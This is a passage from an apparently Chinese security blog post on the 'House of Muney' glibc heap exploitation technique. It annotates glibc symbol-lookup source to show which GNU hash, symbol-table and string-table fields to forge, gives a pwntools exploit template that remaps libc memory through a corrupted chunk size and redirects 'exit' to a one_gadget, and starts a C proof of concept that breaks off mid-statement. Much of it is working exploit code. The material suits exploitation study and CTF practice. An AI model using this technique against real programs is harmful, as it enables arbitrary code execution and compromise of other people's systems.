<span class="literal">NULL</span>)) &#123;</span><br><span class="line">            ElfW(Addr) bitmask_word = bitmask[(new_hash / __ELF_NATIVE_CLASS) &amp; <span class="built_in">map</span>-&gt;l_gnu_bitmask_idxbits]; <span class="comment">// 在对应位置伪造 bitmask_word 。</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>);</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> hashbit2 = ((new_hash &gt;&gt; <span class="built_in">map</span>-&gt;l_gnu_shift) &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely ((bitmask_word &gt;&gt; hashbit1) &amp; (bitmask_word &gt;&gt; hashbit2) &amp; <span class="number">1</span>)) &#123; <span class="comment">// 伪造 bitmask_word 通过这个判断，具体是要让 bitmask_word 的 hashbit1 和 hashbit2 两个位都置位，需要通过调试确定。</span></span><br><span class="line">                Elf32_Word bucket = <span class="built_in">map</span>-&gt;l_gnu_buckets[new_hash % <span class="built_in">map</span>-&gt;l_nbuckets]; <span class="comment">// 在对应位置伪造 bucket 的值。</span></span><br><span class="line">                <span class="keyword">if</span> (bucket != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">const</span> Elf32_Word *hasharr = &amp;<span class="built_in">map</span>-&gt;l_gnu_chain_zero[bucket];<span class="comment">// 在对应位置伪造 hasharr 的值为 new_hash 。</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">do</span></span><br><span class="line">                        <span class="title function_">if</span> <span class="params">(((*hasharr ^ new_hash) &gt;&gt; <span class="number">1</span>) == <span class="number">0</span>)</span> &#123;</span><br><span class="line">                            symidx = ELF_MACHINE_HASH_SYMIDX (<span class="built_in">map</span>, hasharr);</span><br><span class="line">                            sym = check_match(undef_name, ref, version, flags, <span class="comment">// 进这个函数，symtab[symidx] 对应位置需要伪造符号表。</span></span><br><span class="line">                                              type_class, &amp;symtab[symidx], symidx,</span><br><span class="line">                                              strtab, <span class="built_in">map</span>, &amp;versioned_sym,</span><br><span class="line">                                              &amp;num_versions);</span><br><span class="line">                            <span class="keyword">if</span> (sym != <span class="literal">NULL</span>)</span><br><span class="line">                                <span class="keyword">goto</span> found_it;</span><br><span class="line">                        &#125;</span><br><span class="line">                    <span class="keyword">while</span> ((*hasharr++ &amp; <span class="number">1u</span>) == <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* No symbol found.  */</span></span><br><span class="line">            symidx = SHN_UNDEF;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If we have seen exactly one versioned symbol while we are</span></span><br><span class="line"><span class="comment">       looking for an unversioned symbol and the version is not the</span></span><br><span class="line"><span class="comment">       default version we still accept this symbol since there are</span></span><br><span class="line"><span class="comment">       no possible ambiguities.  */</span></span><br><span class="line">        sym = num_versions == <span class="number">1</span> ? versioned_sym : <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sym != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            found_it:</span><br><span class="line">            <span class="comment">/* When UNDEF_MAP is NULL, which indicates we are called from</span></span><br><span class="line"><span class="comment">               do_lookup_x on relocation against protected data, we skip</span></span><br><span class="line"><span class="comment">               the data definion in the executable from copy reloc.  */</span></span><br><span class="line">            <span class="keyword">if</span> (ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA</span><br><span class="line">                &amp;&amp; undef_map == <span class="literal">NULL</span> <span class="comment">// undef_map 不为 NULL 所以不进这个 if 判断。</span></span><br><span class="line">                &amp;&amp; <span class="built_in">map</span>-&gt;l_type == lt_executable</span><br><span class="line">                &amp;&amp; type_class == ELF_RTYPE_CLASS_EXTERN_PROTECTED_DATA) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Hidden and internal symbols are local, ignore them.  */</span></span><br><span class="line">			<span class="comment">// sym-&gt;st_other 既不能等于 STV_HIDDEN(2) 也不能等于 STV_INTERNAL(1) 。</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (dl_symbol_visibility_binds_local_p(sym)))</span><br><span class="line">                <span class="keyword">goto</span> skip;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// sym-&gt;st_info == STB_GLOBAL(1)</span></span><br><span class="line">            <span class="keyword">switch</span> (ELFW(ST_BIND) (sym-&gt;st_info)) &#123;</span><br><span class="line">				...</span><br><span class="line">                <span class="keyword">case</span> STB_GLOBAL:</span><br><span class="line">                    <span class="comment">/* Global definition.  Just what we need.  */</span></span><br><span class="line">                    result-&gt;s = sym;</span><br><span class="line">                    result-&gt;m = (<span class="keyword">struct</span> link_map *) <span class="built_in">map</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 从这里返回 1 表示找到。</span></span><br><span class="line">				...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        skip:;</span><br><span class="line">    &#125; <span class="keyword">while</span> (++i &lt; n);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We have not found anything until now.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>check_match</code> 函数中需要伪造符号表。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *</span><br><span class="line"><span class="title function_">check_match</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> undef_name,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> ElfW(Sym) *<span class="type">const</span> ref,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="keyword">struct</span> r_found_version *<span class="type">const</span> version,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="type">int</span> type_class,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> ElfW(Sym) *<span class="type">const</span> sym,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> Elf_Symndx symidx,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> strtab,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> <span class="keyword">struct</span> link_map *<span class="type">const</span> <span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">            <span class="type">const</span> ElfW(Sym) **<span class="type">const</span> versioned_sym,</span></span><br><span class="line"><span class="params">            <span class="type">int</span> *<span class="type">const</span> num_versions)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> stt = ELFW(ST_TYPE) (sym-&gt;st_info);</span><br><span class="line">    assert (ELF_RTYPE_CLASS_PLT == <span class="number">1</span>);</span><br><span class="line">	<span class="comment">// 这里要求 sym-&gt;st_value 不为空且 sym-&gt;st_shndx 不等于 SHN_UNDEF(0) 。</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely ((sym-&gt;st_value == <span class="number">0</span> <span class="comment">/* No value.  */</span></span><br><span class="line">                           &amp;&amp; sym-&gt;st_shndx != SHN_ABS</span><br><span class="line">                           &amp;&amp; stt != STT_TLS)</span><br><span class="line">                          || ELF_MACHINE_SYM_NO_MATCH(sym)</span><br><span class="line">                          || (type_class &amp; (sym-&gt;st_shndx == SHN_UNDEF))))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ignore all but STT_NOTYPE, STT_OBJECT, STT_FUNC,</span></span><br><span class="line"><span class="comment">       STT_COMMON, STT_TLS, and STT_GNU_IFUNC since these are no</span></span><br><span class="line"><span class="comment">       code/data definitions.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOWED_STT \</span></span><br><span class="line"><span class="meta">  ((1 &lt;&lt; STT_NOTYPE) | (1 &lt;&lt; STT_OBJECT) | (1 &lt;&lt; STT_FUNC) \</span></span><br><span class="line"><span class="meta">   | (1 &lt;&lt; STT_COMMON) | (1 &lt;&lt; STT_TLS) | (1 &lt;&lt; STT_GNU_IFUNC))</span></span><br><span class="line">    <span class="comment">// sym-&gt;st_info 的低 4 比特必须等于 STT_NOTYPE(0)，STT_OBJECT(1)，STT_FUNC(2)，STT_COMMON(5)，STT_TLS(6)，STT_GNU_IFUNC(10) 中的其中一个。</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (((<span class="number">1</span> &lt;&lt; stt) &amp; ALLOWED_STT) == <span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 这里要求 strtab + sym-&gt;st_name 指向被劫持函数的函数名，因为一般不会覆盖到动态符号字符串表 ( .dynstr) ，因此伪造其指向字符串表中的函数名即可。</span></span><br><span class="line">    <span class="keyword">if</span> (sym != ref &amp;&amp; <span class="built_in">strcmp</span>(strtab + sym-&gt;st_name, undef_name))</span><br><span class="line">        <span class="comment">/* Not the symbol we are looking for.  */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *verstab = <span class="built_in">map</span>-&gt;l_versyms;</span><br><span class="line">    <span class="keyword">if</span> (version != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (verstab == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* We can match the version information or use the</span></span><br><span class="line"><span class="comment">               default one if it is not hidden.  */</span></span><br><span class="line">			<span class="comment">// 正常这些检查都能通过，所以直接跳出。</span></span><br><span class="line">            ElfW(Half) ndx = verstab[symidx] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">map</span>-&gt;l_versions[ndx].hash != version-&gt;hash</span><br><span class="line">                 || <span class="built_in">strcmp</span>(<span class="built_in">map</span>-&gt;l_versions[ndx].name, version-&gt;name))</span><br><span class="line">                &amp;&amp; (version-&gt;hidden || <span class="built_in">map</span>-&gt;l_versions[ndx].hash</span><br><span class="line">                    || (verstab[symidx] &amp; <span class="number">0x8000</span>)))</span><br><span class="line">                <span class="comment">/* It&#x27;s not the version we want.  */</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* There cannot be another entry for this symbol so stop here.  */</span></span><br><span class="line">    <span class="keyword">return</span> sym; <span class="comment">// 正常从这里返回。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>整个过程中用到了 ELF GNU Hash Table（<code>.gnu.hash</code> 节，对应 <code>_DYNAMIC</code> 中的 <code>DT_GNU_HASH</code>） ，ELF Symbol Table（<code>.dynsym</code> 节，对应 <code>_DYNAMIC</code> 中的 <code>DT_SYMTAB</code>）和 ELF String Table （<code>.dynstr</code> 节，对应 <code>_DYNAMIC</code> 中的 <code>DT_SYMTAB</code>）。</p>
<ul>
<li><p>ELF GNU Hash Table：哈希表，根据查找的函数名字符串的哈希值在表中快速查找该函数在符号表中的下标。对于该哈希表，ida 与 <code>elftools</code> 中对于成员名的定义有出入：</p>
<table>
<thead>
<tr>
<th>ida 解析的名称</th>
<th>elftools 解析的名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td><code>elf_gnu_hash_nbuckets</code></td>
<td><code>nbuckets</code></td>
<td><code>buckets</code> 中元素的数量。</td>
</tr>
<tr>
<td><code>elf_gnu_hash_nbuckets</code></td>
<td><code>symoffset</code></td>
<td>符号表下标与 <code>bucket</code> 中对应 hash 值的下标</td>
</tr>
<tr>
<td><code>elf_gnu_hash_bitmask_nwords</code></td>
<td><code>bloom_size</code></td>
<td><code>bloom</code> 中元素的数量。</td>
</tr>
<tr>
<td><code>elf_gnu_hash_shift</code></td>
<td><code>bloom_shift</code></td>
<td>检验哈希值是否存在时验证的第二段 6 bit 的起始位置。</td>
</tr>
<tr>
<td><code>elf_gnu_hash_indexes</code></td>
<td><code>bloom</code></td>
<td>类似 bitmap，用来判断哈希值是否在哈希表中存在，结果不一定准确，只是一种剪枝优化。</td>
</tr>
<tr>
<td><code>elf_gnu_hash_bucket</code></td>
<td><code>buckets</code></td>
<td>哈希值模 <code>nbucket</code> 作为下标对应的 <code>buckets</code> 项存放着 <code>chain</code> 中模 <code>nbucket</code> 相同的哈希值中第一个的下标。</td>
</tr>
<tr>
<td><code>elf_gnu_hash_chain</code></td>
<td><code>chain</code></td>
<td>存储着所有符号对应的哈希值，模 <code>nbucket</code> 相同的哈希值存放在一起。</td>
</tr>
</tbody></table>
</li>
<li><p>ELF Symbol Table：<code>Elf64_Sym</code> 结构体数组，记录了符号的一些相关信息。</p>
  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>st_name</code>：符号名称在字符串表中的偏移量。</li>
<li><code>st_info</code>：符号类型和绑定信息，低 4 比特必须等于 <code>STT_NOTYPE(0)</code>，<code>STT_OBJECT(1)</code>，<code>STT_FUNC(2)</code>，<code>STT_COMMON(5)</code>，<code>STT_TLS(6)</code>，<code>STT_GNU_IFUNC(10)</code> 中的其中一个。</li>
<li><code>st_other</code>：保留字段，通常为 0 。</li>
<li><code>st_shndx</code>：通常为符号所在节的索引。不能为 <code>SHN_UNDEF(0)</code>，因为 <code>SHN_UNDEF</code> 表示该符号未定义但是在该文件中被引用到，即该符号可能定义在其他目标文件中。</li>
<li><code>st_value</code>：符号的在该模块中的 RVA ，<strong>可以被我们伪造为该模块中的某个地址（例如 <code>one_gadget</code>）对应的 RVA 从而劫持程序执行流程。</strong></li>
<li><code>st_size</code>：符号的大小，这里指的是要重定位的 got 表项的大小，即 8 。不过由于该成员在符号查询过程中未被使用因此不伪造该成员也没影响。</li>
</ul>
</li>
<li><p>ELF String Table：符号名称对应的字符串构成的字符串表，需要伪造 <code>Elf64_Sym</code> 中的 <code>st_name</code> 为查询的函数的名称对应字符串与字符串表起始地址的偏移。因为字符串表要被用到因此不能破坏该结构。如果被破坏需要在对应位置伪造字符串。</p>
</li>
</ul>
<p>延迟绑定中查找函数地址的过程（具体过程参考 <code>pwntools</code> 的依赖库 <code>elftools</code> 中的 <code>GNUHashTable</code> 类中的 <code>get_symbol</code> 函数）：</p>
<ul>
<li>在 <code>_dl_lookup_symbol_x</code> 函数中，调用 <code>dl_new_hash</code> 函数计算要调用的函数的名称的哈希值。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint_fast32_t</span></span><br><span class="line"><span class="title function_">dl_new_hash</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">uint_fast32_t</span> h = <span class="number">5381</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c = *s; c != <span class="string">&#x27;\0&#x27;</span>; c = *++s)</span><br><span class="line">        h = h * <span class="number">33</span> + c;</span><br><span class="line">    <span class="keyword">return</span> h &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uint_fast32_t</span> new_hash = dl_new_hash(undef_name);</span><br></pre></td></tr></table></figure></div></li>
<li>在 <code>do_lookup_x</code> 函数中，将 <code>new_hash</code> 除以 <code>__ELF_NATIVE_CLASS(64)</code> 关于 <code>bloom_size</code> 取模的结果作为 <code>bloom</code> 的下标取出对应的 <code>bloom</code> 的值 <code>bitmask_word</code> 。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">ElfW(Addr) bitmask_word = bitmask[(new_hash / __ELF_NATIVE_CLASS) &amp; <span class="built_in">map</span>-&gt;l_gnu_bitmask_idxbits]; </span><br></pre></td></tr></table></figure></div></li>
<li>对 <code>bitmask_word</code> 作一个验证，要求 <code>bitmask_word</code> 的第 <code>new_hash % 64</code> 和 <code>(new_hash &gt;&gt; bloom_shift) % 64</code> 位都要置位，这里判断了两段 6 bit 数据提升准确率（如果前面计算下标没有 <code>bloom_size</code> 取模的限制则这里只需判断低 6 bit 即可，而这里判断的两段 6 bit 还会相互影响，总之是玄学优化）。 在伪造时只需要将 <code>bloom</code> 对应位置保留原数据即可。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hashbit2 = ((new_hash &gt;&gt; <span class="built_in">map</span>-&gt;l_gnu_shift) &amp; (__ELF_NATIVE_CLASS - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely((bitmask_word &gt;&gt; hashbit1) &amp; (bitmask_word &gt;&gt; hashbit2) &amp; <span class="number">1</span>))</span><br></pre></td></tr></table></figure></div></li>
<li>将 <code>new_hash</code> 与 <code>nbuckets</code> 取模的结果作为下标取出 <code>buckets</code> 中的对应项 <code>bucket</code> 。位置时保留原数据即可。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">Elf32_Word bucket = <span class="built_in">map</span>-&gt;l_gnu_buckets[new_hash % <span class="built_in">map</span>-&gt;l_nbuckets];</span><br></pre></td></tr></table></figure></div></li>
<li>如果 <code>bucket</code> 不为空则从 <code>bucket</code> 作为的下标开始向后遍历 <code>chain</code> 直到 <code>chain[bucket]</code> 与 <code>new_hash</code> 除最低位外相同时计算符号表下标为 <code>bucket - symoffset</code> 。如果找到则调用 <code>check_match</code> 查询符号表得到目标函数的 RVA 。伪造时只需在 <code>chain[bucket]</code> 上伪造 <code>new_hash</code> 即可。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (bucket != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">const</span> Elf32_Word *hasharr = &amp;<span class="built_in">map</span>-&gt;l_gnu_chain_zero[bucket];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="title function_">if</span> <span class="params">(((*hasharr ^ new_hash) &gt;&gt; <span class="number">1</span>) == <span class="number">0</span>)</span> &#123;</span><br><span class="line">            symidx = ELF_MACHINE_HASH_SYMIDX(<span class="built_in">map</span>, hasharr);</span><br><span class="line">            sym = check_match(undef_name, ref, version, flags,</span><br><span class="line">                              type_class, &amp;symtab[symidx], symidx,</span><br><span class="line">                              strtab, <span class="built_in">map</span>, &amp;versioned_sym,</span><br><span class="line">                              &amp;num_versions);</span><br><span class="line">            <span class="keyword">if</span> (sym != <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">goto</span> found_it;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">while</span> ((*hasharr++ &amp; <span class="number">1u</span>) == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
  模板：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add_chunk(<span class="number">0</span>, <span class="number">0x40000</span> - <span class="number">0x2000</span>)</span><br><span class="line"></span><br><span class="line">edit_chunk(<span class="number">0</span>, n64(-<span class="number">8</span>), p64(<span class="number">0x41002</span> + <span class="number">0x5000</span> + <span class="number">0x4000</span>))</span><br><span class="line"></span><br><span class="line">delete_chunk(<span class="number">0</span>)</span><br><span class="line">add_chunk(<span class="number">0</span>, <span class="number">0x41000</span> * <span class="number">2</span> + <span class="number">0x4000</span>)</span><br><span class="line"></span><br><span class="line">base_off = <span class="number">0x7dff0</span></span><br><span class="line">one_gadget = [<span class="number">0xcbd71</span>, <span class="number">0xcbd74</span>, <span class="number">0xcbd77</span>][<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">gnu_hash_section = libc.get_section_by_name(<span class="string">&#x27;.gnu.hash&#x27;</span>)</span><br><span class="line">dynsym_section = libc.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>)</span><br><span class="line">dynstr_section = libc.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">namehash = gnu_hash_section.gnu_hash(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bloom_off = gnu_hash_section[<span class="string">&#x27;sh_addr&#x27;</span>] + <span class="number">4</span> * gnu_hash_section._wordsize</span><br><span class="line">bucket_off = bloom_off + gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>] * gnu_hash_section._xwordsize</span><br><span class="line"></span><br><span class="line">bloom_elem_idx = (namehash / gnu_hash_section.elffile.elfclass) % gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>]</span><br><span class="line">bloom_elem_off = bloom_off + gnu_hash_section._xwordsize * bloom_elem_idx</span><br><span class="line">bloom_elem_val = gnu_hash_section.params[<span class="string">&#x27;bloom&#x27;</span>][bloom_elem_idx]</span><br><span class="line"></span><br><span class="line">bucket_elem_idx = namehash % gnu_hash_section.params[<span class="string">&#x27;nbuckets&#x27;</span>]</span><br><span class="line">bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize</span><br><span class="line">bucket_elem_val = gnu_hash_section.params[<span class="string">&#x27;buckets&#x27;</span>][bucket_elem_idx]</span><br><span class="line"></span><br><span class="line">hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params[<span class="string">&#x27;symoffset&#x27;</span>]) * gnu_hash_section._wordsize</span><br><span class="line"></span><br><span class="line">sym_off = dynsym_section[<span class="string">&#x27;sh_offset&#x27;</span>] + bucket_elem_val * dynsym_section[<span class="string">&#x27;sh_entsize&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sym_value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sym_value += p32(libc.search(<span class="string">&#x27;exit\x00&#x27;</span>).<span class="built_in">next</span>() - dynstr_section[<span class="string">&#x27;sh_offset&#x27;</span>])  <span class="comment"># st_name</span></span><br><span class="line">sym_value += p8(<span class="number">0x12</span>)  <span class="comment"># st_info</span></span><br><span class="line">sym_value += p8(<span class="number">0</span>)  <span class="comment"># st_other</span></span><br><span class="line">sym_value += p16(<span class="number">1</span>)  <span class="comment"># st_shndx</span></span><br><span class="line">sym_value += p64(one_gadget)  <span class="comment"># st_value</span></span><br><span class="line">sym_value += p8(<span class="number">8</span>)  <span class="comment"># st_size</span></span><br><span class="line"></span><br><span class="line">edit_chunk(<span class="number">0</span>, base_off + bloom_elem_off, p64(bloom_elem_val))</span><br><span class="line">edit_chunk(<span class="number">0</span>, base_off + bucket_elem_off, p32(bucket_elem_val))</span><br><span class="line">edit_chunk(<span class="number">0</span>, base_off + hasharr_off, p64(namehash))</span><br><span class="line">edit_chunk(<span class="number">0</span>, base_off + sym_off, sym_value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b do_lookup_x\nc&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_muney" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc 1.c -o 1 -g  -Wl,-z,lazy</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> *strptr = mmap((<span class="type">void</span> *) <span class="number">0xdeadb000</span>, <span class="number">0x1000</span>, <span class="number">6</span>, <span class="number">0x22</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(strptr, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step1: allocate a chunk ---&gt; void* ptr = malloc(0x40000);&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *ptr = (<span class="type">size_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x40000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> sz = ptr[<span class="number">-1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] ptr address: %p, chunk size: %p\n&quot;</span>, ptr, (<span class="type">void</span> *) sz);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step2: change the size of the chunk ---&gt; ptr[-1] += 0x5000 + 0x4000;&quot;</span>);</span><br><span class="line">    ptr[<span class="number">-1</span>] += <span class="number">0x5000</span> + <span class="number">0x4000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step3: free ptr and steal heap from glibc ---&gt; free(ptr);&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step4: retrieve heap ---&gt; ptr = malloc(0x41000 * 2+  0x4000);&quot;</span>);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x41000</span> * <span class="number">2</span> + <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    sz = ptr[<span class="number">-1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] ptr address: %p, chunk size: %p\n&quot;</span>, ptr, (<span class="type">void</span> *) sz);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当前ptr到原有libc基地址的偏移</span></span><br><span class="line">    <span class="type">size_t</span> base_off = <span class="number">0x7dff0</span>;</span><br><span class="line">    <span class="comment">// 以下地址均是相对于libc基地址的偏移</span></span><br><span class="line">    <span class="type">size_t</span> system_off = <span class="number">0x48a20</span>;</span><br><span class="line">    <span class="type">size_t</span> bitmask_word_off = <span class="number">0x4070</span>;</span><br><span class="line">    <span class="type">size_t</span> bucket_off = <span class="number">0x4198</span>;</span><br><span class="line">    <span class="type">size_t</span> exit_sym_st_value_off = <span class="number">0x81d8</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="type">size_t</span> hasharr_off = <span class="number">0x5264</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] step5: set essential data for dl_runtime_resolve&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">char</span> *) ptr + base_off + bitmask_word_off) = <span class="number">0xf000028c0200130e</span>ul;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set bitmask_word to 0xf000028c0200130eul&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">int</span> *) ((<span class="type">char</span> *) ptr + base_off + bucket_off) = <span class="number">0x86</span>u;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] set bucket to 0x86u&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *) ((<span class="type">char</span> *) ptr + base_off + exit_sym_st_value_off) = 